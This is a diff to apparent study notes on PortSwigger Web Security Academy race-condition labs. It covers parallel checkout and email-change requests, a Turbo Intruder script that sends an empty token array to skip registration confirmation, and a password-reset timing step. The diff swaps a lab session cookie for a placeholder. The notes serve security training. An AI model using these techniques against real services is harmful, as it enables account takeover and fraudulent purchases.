@@ -1119,13 +1119,13 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
      - **check out**: POST /cart/checkout csrf=x6iduAm1T1W4PglGBhWRD94NTLa0W4jk
      - **add jacket**: POST /cart productId=1&redir=PRODUCT&quantity=1
    - under check out tab > send group (parallel)
-4. Single-endpoint race conditions   
+4. **Single-endpoint race conditions**   
    - **POST /my-account/change-email**   
      - request 1: anything@exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net   
      - request 2: carlos@ginandjuice.shop   
    - send the requests in parallel   
    - Receive email of carlos@ginandjuice.shop, click the confirmation link to update your address accordingly.   
-5. Partial construction race conditions (Expert)
+5. Partial construction **race conditions (Expert)**
    - **POST /register**   
      csrf=CRs0ranHwII63CbQnp32ZGxCEKavBZcO&username=`%s`&email=user%40ginandjuice.shop&password=123456
    - **send to turbbo intruder**
@@ -1138,8 +1138,8 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
                             )
     
      confirmationReq = '''POST /confirm?token[]= HTTP/2
-     Host: 0ac7000204681544819facc200310057.web-security-academy.net
-     Cookie: phpsessionid=NzQYwl5AGYNLGU50kB1QxFMfV54fXskz
+     Host: <YOUR-LAB-ID.web-security-academy.net>
+     Cookie: phpsessionid=<YOUR-SESSION-TOKEN>
      Content-Length: 0
        
      for attempt in range(20):
@@ -1161,6 +1161,7 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
 
      username=User0&email=user%40ginandjuice.shop&password=123456
      ```
+   - check 200 response contain "Account registration for user <USERNAME> successful"
 7. Exploiting time-sensitive vulnerabilities
    - GET /forgot-password > repeater > remove the session cookie
    - From the response， grab the cookie and csrf token. Paste to 2nd request  
